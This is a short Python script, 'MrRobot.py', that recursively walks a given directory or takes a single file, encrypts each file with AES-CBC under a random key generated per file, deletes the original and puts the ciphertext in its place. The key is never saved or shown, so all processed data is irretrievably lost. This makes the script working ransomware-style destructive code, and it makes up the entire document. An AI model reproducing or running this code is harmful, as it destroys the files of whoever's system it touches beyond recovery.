import sys, os, struct
from Crypto.Cipher import AES
import Crypto.Random as rand
import getopt

def usage():
    print("usage: python MrRobot.py [--OPTIONS] input_directory ")
    print("       python MrRobot.py [--OPTIONS] input_file ")
    print()
    print("OPTIONS: ")
    print("    -h --help    : Displays this message.")
    print("    -v --verbose : Enables verbose mode.")


def processFile(fn, verbose):
    if(verbose):
        print("Processing file:",os.path.abspath(fn))

    fn_out = fn+'.enc'
    key = rand.new().read(32)
    chunksize = 64*1024
    filesize = os.path.getsize(fn)
    iv = rand.new().read(AES.block_size)
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    if(verbose):
        print("Encypting files.")
    
    with open(fn, 'rb') as infile:
        with open(fn_out, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

    # Delete original file
    if(verbose):
        print("Encyption finished.")    
    if(verbose):
        print("Removing original file.")    
    os.remove(fn)
    # replace with encoded file
    if(verbose):
        print("Replacing with encrypted file.")        
    os.rename(fn_out, fn)

    return 1

def processDir(dn, verbose):
    if(verbose):
        print("Walking the directory recursively.")

    for root, dirnames, filenames in os.walk(dn):
        for filename in filenames:
            processFile(os.path.join(root, filename), verbose)

    return 1

def main(argv):
    verbose=False
    try:
        opts, args = getopt.getopt(argv, "hv", ["help", "verbose"])
    except getopt.GetoptError:
        usage()
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-v", "--verbose"):
            verbose=True

    if os.path.isdir(argv[-1]):
        dn = argv[-1]
        if(verbose):
            print("Directory input parameter detected:",os.path.abspath(dn))        
        processDir(os.path.abspath(dn), verbose)
    elif os.path.isfile(argv[-1]):
        fn = argv[-1]
        if(verbose):
            print("File input parameter detected:",os.path.abspath(fn))
        processFile(os.path.abspath(fn), verbose)
    else:
        print("Error: File or directory not found. Exiting.")
        usage()
        sys.exit(2)


if __name__ == "__main__":
    if(len(sys.argv) > 1):
        main(sys.argv[1:])
        exit(0)
    else:
        usage()
        exit(2)
